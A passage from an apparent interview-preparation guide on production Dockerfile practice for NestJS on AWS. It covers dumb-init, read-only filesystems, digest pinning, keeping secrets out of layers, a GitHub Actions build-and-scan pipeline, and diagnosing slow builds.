#   Node.js does not forward SIGTERM to its child processes.
#   After 10 seconds, Docker sends SIGKILL.
#   In-flight requests are dropped; DB connections are not cleanly closed.
#   NestJS onApplicationShutdown() never runs.
#
# dumb-init IS designed to run as PID 1:
#   Forwards all signals (SIGTERM, SIGINT, SIGHUP) to the child process group.
#   Reaps zombie processes (Node child_process.spawn() zombies).
#   node receives SIGTERM → NestJS graceful shutdown → clean exit.
#
# Alternatives: tini (same purpose; included in official Docker images as --init flag)
#   docker run --init nestjs-api  → uses Docker's bundled tini
#   Kubernetes does not use --init by default; use dumb-init or tini in the image.
```

**3. Read-only filesystem:**

```dockerfile
# The runtime image should not need to write to its own filesystem.
# Enforce this at runtime:
# docker run --read-only --tmpfs /tmp nestjs-api

# Or in Kubernetes:
# securityContext:
#   readOnlyRootFilesystem: true
# volumeMounts:
#   - name: tmp
#     mountPath: /tmp
# volumes:
#   - name: tmp
#     emptyDir: {}

# For Node.js apps that write temp files:
# Ensure all writes go to /tmp (tmpfs) or a mounted volume,
# not to /app or other directories in the image layer.
# If NestJS writes upload buffers to disk:
#   configure multer's dest to /tmp, not /app/uploads
```

**4. Pinned base image digests:**

```dockerfile
# Unpinned (mutable — tag can point to different image after a push):
FROM node:20-alpine

# Pinned to a specific immutable digest:
FROM node:20-alpine@sha256:2c6b0b6b8c6a...

# Why pinning matters:
#   node:20-alpine is a mutable tag. AWS or Docker Hub could push a new
#   image with the same tag that includes a vulnerability or breaking change.
#   A build that passes today may fail (or worse, silently misbehave) tomorrow
#   if the base image changes.
#
#   Pinning to a digest ensures builds are bit-for-bit reproducible.
#   The trade-off: you must update the digest deliberately to get security patches.
#
# Automation: Dependabot and Renovate Bot can automatically open PRs
#   when the pinned digest has a newer version with security patches.
#   This gives you both reproducibility AND timely patching.

# Get the current digest:
docker pull node:20-alpine
docker inspect node:20-alpine --format '{{index .RepoDigests 0}}'
# → node@sha256:2c6b0b6b8c6a...
```

**5. No secrets in the image (ever):**

```dockerfile
# ❌ WRONG — secret baked into the layer, visible in docker history
ARG DATABASE_URL
ENV DATABASE_URL=${DATABASE_URL}

# ❌ WRONG — .env file copied into image
COPY .env ./

# ❌ WRONG — even if deleted in the next layer, the file exists in the previous layer
RUN echo "API_KEY=secret" > /tmp/secret.txt && \
    do_something && \
    rm /tmp/secret.txt   # ← secret is still in the layer created by this RUN step

# ✅ CORRECT — secrets at runtime via SSM/Secrets Manager, not build-time
# In UserData / entrypoint.sh (not in Dockerfile):
aws ssm get-parameter --name /prod/nestjs-api/DATABASE_URL \
  --with-decryption --query Parameter.Value --output text

# ✅ CORRECT — BuildKit secret mount (never written to any image layer)
RUN --mount=type=secret,id=npm_token \
    NPM_TOKEN=$(cat /run/secrets/npm_token) \
    npm ci
# Build: docker buildx build --secret id=npm_token,src=.npmrc .
# The .npmrc content is available inside the RUN command but NEVER in any layer.
# Use for: private npm registry tokens, GitHub tokens for private packages.
```

## Section 6: Operational Patterns and CI/CD Integration

**Q12. How do you structure Docker builds in a CI/CD pipeline for a NestJS service on AWS?**
A: A production CI/CD Docker build pipeline has five concerns: layer cache efficiency (speed), multi-architecture support (ARM64/Graviton), image scanning (security), registry push (artifact storage), and deployment trigger (ASG instance refresh / ECS service update).

**Complete GitHub Actions pipeline:**

```yaml
name: Build and Push

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

env:
  ECR_REGISTRY: 123456789012.dkr.ecr.ap-south-1.amazonaws.com
  ECR_REPOSITORY: nestjs-api
  AWS_REGION: ap-south-1

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      id-token: write   # OIDC for AWS
      contents: read

    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS credentials (OIDC — no static keys)
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GithubActionsBuildRole
          aws-region: ${{ env.AWS_REGION }}

      - name: Login to ECR
        uses: aws-actions/amazon-ecr-login@v2

      - name: Set up Docker Buildx (enables BuildKit, multi-arch)
        uses: docker/setup-buildx-action@v3

      - name: Build and push
        uses: docker/build-push-action@v6
        with:
          context: .
          platforms: linux/amd64,linux/arm64    # arm64 for Graviton EC2 instances
          push: ${{ github.ref == 'refs/heads/main' }}
          tags: |
            ${{ env.ECR_REGISTRY }}/${{ env.ECR_REPOSITORY }}:${{ github.sha }}
            ${{ env.ECR_REGISTRY }}/${{ env.ECR_REPOSITORY }}:latest
          cache-from: type=registry,ref=${{ env.ECR_REGISTRY }}/${{ env.ECR_REPOSITORY }}:cache
          cache-to:   type=registry,ref=${{ env.ECR_REGISTRY }}/${{ env.ECR_REPOSITORY }}:cache,mode=max
          build-args: |
            GIT_SHA=${{ github.sha }}
            BUILD_DATE=${{ steps.date.outputs.date }}
            APP_VERSION=${{ steps.version.outputs.version }}

      - name: Scan image for vulnerabilities (Trivy)
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: ${{ env.ECR_REGISTRY }}/${{ env.ECR_REPOSITORY }}:${{ github.sha }}
          format: sarif
          output: trivy-results.sarif
          severity: CRITICAL,HIGH
          exit-code: '1'    # fail the pipeline on CRITICAL/HIGH CVEs
        if: github.ref == 'refs/heads/main'

      - name: Trigger ASG Instance Refresh (deploy)
        if: github.ref == 'refs/heads/main'
        run: |
          aws autoscaling start-instance-refresh \
            --auto-scaling-group-name nestjs-api-asg \
            --preferences '{
              "MinHealthyPercentage": 80,
              "WarmupSeconds": 300,
              "CheckpointPercentages": [50],
              "CheckpointDelay": 600
            }'
```

**Multi-architecture builds for Graviton (arm64):**

```
Why multi-arch matters:
  Graviton3 (m7g, c7g, r7g) instances run ARM64.
  An image built on an x86_64 CI runner produces an amd64 image by default.
  Running an amd64 image on ARM64 uses QEMU emulation:
    Container starts correctly, but CPU-intensive work runs at ~30–50% speed.
    Emulation does not affect simple I/O-bound workloads noticeably,
    but node:20-alpine@sha256:amd64 on ARM64 is a silent performance regression.

Solution: build a multi-platform manifest with docker buildx:
  --platforms linux/amd64,linux/arm64

  docker buildx creates a manifest list pointing to two image manifests:
    image:sha → amd64 → amd64-specific layers
    image:sha → arm64 → arm64-specific layers

  When a Graviton EC2 instance pulls the image:
    Docker reads its own architecture (arm64) and pulls the arm64 manifest.
    Native ARM64 binary — full Graviton performance.

Build time for multi-arch:
  BuildKit builds both architectures in parallel (if the runner has QEMU).
  Alpine + Node.js compiles cleanly for both targets.
  Some native addons (with pre-built binaries) need separate prebuilt .node files
  for amd64 and arm64 — most major packages (Sharp, bcrypt) provide both.
```

**Q13. How do you diagnose a slow Docker build, and what levers do you pull to fix it?**
A: Slow builds almost always fall into three categories: cache misses (the most common), large build contexts, or slow operations inside `RUN` instructions. Each has a distinct diagnostic signal and fix.

```
Diagnostic step 1: measure each layer
  DOCKER_BUILDKIT=1 docker build --progress=plain . 2>&1 | grep -E "^#[0-9]+ \[|CACHED|[0-9]+\.[0-9]+s"

  Output:
    #5 [deps 2/2] RUN npm ci            CACHED     ← 0s (cache hit)
    #6 [builder 2/3] COPY . .           0.3s       ← 0.3s (fast; just a copy)
    #7 [builder 3/3] RUN npm run build  45.2s      ← 45s (tsc compile; expected)
    #8 [runtime 2/4] COPY --from=...   1.1s

  If npm ci shows CACHED → cache is working.
  If npm ci shows 60s → cache is missing; find why (see Q2 diagnostics).

Diagnostic step 2: check build context size
  docker build . --no-cache 2>&1 | head -1
  # "Sending build context to Docker daemon  892MB"  ← .dockerignore problem
  # "Sending build context to Docker daemon  1.2MB"  ← correct

Diagnostic step 3: identify the slow RUN instruction
  RUN npm ci taking 90s in CI even with cache FROM:
    → Cache FROM is not being populated (mode=min instead of mode=max; wrong tag)
    → package-lock.json is changing on every CI run (npm install generating it fresh)
      Fix: commit package-lock.json; use npm ci (not npm install) in Dockerfile

  RUN npm run build taking 120s:
    → TypeScript incremental compilation not used
      Fix: add "incremental": true to tsconfig; use --mount=type=cache for .tsbuildinfo:
      RUN --mount=type=cache,target=/app/.tsbuildinfo \
          npm run build

  RUN apk add taking 30s:
    → apk index being re-fetched
      Fix: --mount=type=cache for apk:
      RUN --mount=type=cache,target=/var/cache/apk \
          apk add --no-cache dumb-init

Common fixes summary:
  Problem                           Fix
  ──────────────────────────────   ──────────────────────────────────────────
  Cache miss: wrong COPY order     Move COPY package*.json before COPY . .
  Cache miss: ARG before RUN       Move ARG/LABEL to after expensive layers
  Cache miss: no registry cache    Add --cache-from/--cache-to in CI build
  Large context (node_modules)     Add node_modules/ to .dockerignore
  npm install not npm ci           Use npm ci — deterministic; cache-friendly
  Slow tsc on every build          Add incremental tsbuildinfo cache mount
  Multi-arch slow on QEMU          Use native arm64 CI runner for arm64 stage
  Large final image                Use multi-stage; verify with docker history
```

## The Core Mental Model

```
A Docker image is a stack of immutable layers, built bottom-up.
Change propagates upward: one layer change invalidates every layer above it.
Design follows one rule: least-changing layers at the bottom; most-changing at the top.

The canonical order for any application:
  1. Base OS (FROM)                     ← changes: never (pin digest)
  2. System packages (RUN apk add)      ← changes: quarterly (OS patches)
  3. Package manifests (COPY package*)  ← changes: when dependencies change
  4. Dependencies (RUN npm ci)          ← changes: when package.json changes
  5. Source code (COPY . .)             ← changes: every commit
  6. Build step (RUN npm run build)     ← changes: every commit
  7. Runtime config (CMD, ENTRYPOINT)   ← changes: rarely

Multi-stage build is the contract between "what you need to build"
and "what you need to run":
  Builder stage: has TypeScript, Jest, ESLint, source code — everything to compile.
  Runtime stage: has Node.js binary, dist/, production node_modules — nothing else.
  COPY --from=builder selectively promotes artifacts across the stage boundary.
  Everything left in the builder stage is discarded — it never enters the registry.

The build cache is an optimization, not a guarantee:
  In CI, treat cache as a performance optimization, not a correctness mechanism.
  Always use npm ci (not npm install) — deterministic, matches package-lock.json exactly.
  Always commit package-lock.json — it is the source of truth for reproducibility.
  Registry cache (--cache-from/--cache-to) bridges the stateless gap between CI runners.

Minimal base image is the single highest-ROI security decision:
  node:20 → node:20-alpine: 350 MB → 55 MB; removes apt, gcc, Python, build tools.
  node:20-alpine → distroless: 55 MB → 50 MB; removes sh, apk, curl, busybox.
  Each reduction removes a tool an attacker could use after achieving RCE.
  The security argument is not about image size — it is about post-exploitation capability.

Non-root + dumb-init + read-only filesystem = the production security baseline:
  Non-root: limits OS-level damage from RCE.
  dumb-init: ensures SIGTERM reaches Node.js; graceful shutdown actually works.
  Read-only root filesystem: prevents an attacker from writing payloads to the image.
  These three are not optional for any service handling real user data.

Secrets never touch an image layer — not even "temporarily":
  A secret written and deleted in separate RUN instructions is still in the layer history.
  docker history --no-trunc image:tag reveals every RUN command ever executed.
  BuildKit --mount=type=secret: the secret is available inside RUN but written to no layer.
  Runtime secrets (SSM Parameter Store, Secrets Manager): pulled in entrypoint, not Dockerfile.
  A secret found in docker history is a secret that must be rotated immediately.
```

**Tip for the interview:** Dockerfile questions at 5 YOE converge on three areas: (1) the layer cache invalidation cascade — explaining exactly WHY `COPY package*.json ./` must precede `COPY . .`, and that any cache miss propagates downward through all subsequent layers, demonstrates you have debugged the "why is npm ci running on every build?" problem in production CI; this is the single most common Dockerfile mistake at scale; (2) multi-stage build anatomy — walking through the builder → prod-deps → runtime pattern, explaining what `COPY --from=` copies across the stage boundary and what is discarded, and calculating the image size difference (786 MB → 147 MB) shows you understand that the security argument for multi-stage is attack surface reduction, not just bandwidth savings; (3) the PID 1 / dumb-init problem — explaining that `docker stop` sends SIGTERM to PID 1, that Node.js does not forward SIGTERM to child processes when running as PID 1, and that without dumb-init or tini the graceful shutdown hook in NestJS never fires, is the production detail that separates someone who has debugged "containers taking 10 seconds to stop and dropping requests" from someone who copied a Dockerfile from a tutorial. The fintech callout: for NACH batch containers and KYC pipeline workers, distroless base images + read-only filesystems + Trivy scans in CI are non-negotiable for SOC 2 and RBI IT framework compliance — the security audit will ask for evidence that no shell exists in production containers and that all images are scanned before deployment.
